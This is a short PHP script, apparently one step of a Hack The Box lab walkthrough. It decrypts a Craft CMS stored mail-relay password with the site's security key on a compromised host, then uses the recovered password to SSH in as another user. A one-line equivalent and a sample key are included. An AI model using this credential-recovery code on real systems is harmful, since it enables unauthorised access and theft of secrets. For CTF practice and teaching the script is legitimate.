<?php
/**
 * HTB Layover - Phase 4b: decrypt the mail-relay password from Craft CMS.
 *
 * Craft stores secrets with Yii2's Security::encryptByKey() using
 * CRAFT_SECURITY_KEY (AES-256-CBC + HMAC, base64 ciphertext). The value in
 * htbairways_settings.mailRelayPassword is exactly that blob, so we just call
 * the framework decryptor with the same key.
 *
 * Run it ON THE TARGET (the vendor autoloader is there):
 *
 *   php 04_decrypt_aporter.php '<base64_blob>' '<CRAFT_SECURITY_KEY>'
 *
 * e.g.
 *   php 04_decrypt_aporter.php 'u0E7Ogb...Nl5w=' 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr'
 *
 * If you cannot copy the file over, the one-liner is equivalent:
 *   php -r 'require "/var/www/portal/vendor/autoload.php";
 *           $s = new yii\base\Security();
 *           echo $s->decryptByKey(base64_decode($argv[1]), $argv[2]), "\n";' \
 *       '<blob>' '<key>'
 *
 * Expected output:  aporter's password  ->  ssh aporter@<target>
 */

$autoload = getenv('CRAFT_AUTOLOAD') ?: '/var/www/portal/vendor/autoload.php';

if ($argc < 3) {
    fwrite(STDERR, "usage: php " . basename(__FILE__) . " <base64_blob> <CRAFT_SECURITY_KEY>\n");
    exit(1);
}

if (!file_exists($autoload)) {
    fwrite(STDERR, "[-] autoloader not found at $autoload\n");
    fwrite(STDERR, "    set CRAFT_AUTOLOAD=/path/to/vendor/autoload.php\n");
    exit(2);
}

require $autoload;

$blob = $argv[1];
$key  = $argv[2];

$raw = base64_decode($blob, true);
if ($raw === false) {
    fwrite(STDERR, "[-] blob is not valid base64\n");
    exit(3);
}

try {
    $security = new yii\base\Security();
    echo $security->decryptByKey($raw, $key), "\n";
} catch (\Throwable $e) {
    fwrite(STDERR, "[-] decryption failed: " . $e->getMessage() . "\n");
    exit(4);
}
